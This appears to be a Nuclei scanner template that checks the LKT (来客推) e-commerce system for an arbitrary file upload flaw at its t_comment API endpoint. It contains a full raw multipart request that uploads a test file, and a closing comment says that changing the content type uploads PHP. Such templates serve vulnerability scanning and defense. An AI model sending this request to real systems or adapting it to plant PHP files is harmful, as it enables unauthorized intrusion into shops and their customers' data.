id: LKT-index-upload

info:
  name: Template Name
  author: wangzong
  severity: critical
  description: 来客推电商系统t_comment存在任意文件上传漏洞
  reference:
    - https://
  tags: tags

http:
  - raw:
      - |
        POST /LKT/index.php?module=api&action=product&m=t_comment HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 279
        Cache-Control: max-age=0
        Accept-Language: zh-CN,zh;q=0.9
        Origin: http://{{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary20pm1TSrbhDyPQjm
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (X11; Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6793.72 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Referer: http://{{Hostname}}/LKT/index.php?module=Login
        Accept-Encoding: gzip, deflate, br
        Cookie: admin_mojavi=8ipttgv0vqrgikh2qd05hrvmj4
        sec-ch-ua-platform: "Linux"
        sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="131", "Google Chrome";v="131"
        sec-ch-ua-mobile: ?0
        Connection: close

        ------WebKitFormBoundary20pm1TSrbhDyPQjm
        Content-Disposition: form-data; name="type"

        file
        ------WebKitFormBoundary20pm1TSrbhDyPQjm
        Content-Disposition: form-data; name="imgFile"; filename="1.txt"
        Content-Type: image/txt

        whoisceshi
        ------WebKitFormBoundary20pm1TSrbhDyPQjm--
    matchers:
      - type: word
        part: body
        words:
          - '.txt'        
#Content-Type: image/php  上传为php